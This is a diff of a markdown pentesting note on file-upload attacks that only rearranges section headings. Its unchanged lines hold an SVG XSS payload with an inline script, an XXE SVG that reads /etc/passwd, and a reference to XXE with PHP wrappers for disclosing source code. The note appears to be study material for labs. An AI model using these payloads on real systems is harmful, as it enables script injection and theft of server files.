@@ -19,7 +19,7 @@ If the web applications displays an image's metadata after its upload, we can pe
   `Artist` parameters. Furthermore, if we change the image's `MIME-Type` to `text/html`, some web applications may show it as an HTML 
   document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.
 ---
-## Common file disclosure
+## `.svg` Attacks
 - Custom `.svg` image:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
@@ -37,13 +37,14 @@ If the web applications displays an image's metadata after its upload, we can pe
       <script type="text/javascript">alert(window.origin);</script>
   </svg>
   ```
-## Source code file Disclosure
+## Common file disclosure
 - `XXE` via `.svg` file:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <svg>&xxe;</svg>
   ```
+## Source code file Disclosure
 - `XXE` via `.svg` file with `PHP Wrappers`:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
@@ -52,6 +53,7 @@ If the web applications displays an image's metadata after its upload, we can pe
   ```
 ---
 
+## Exercise
 
 We attempted to upload a simple `.png` image but we received the response with the message "Only SVG images are allowed":
 ![image](https://github.com/user-attachments/assets/36479000-2f72-4e4b-8893-99deeb070204)
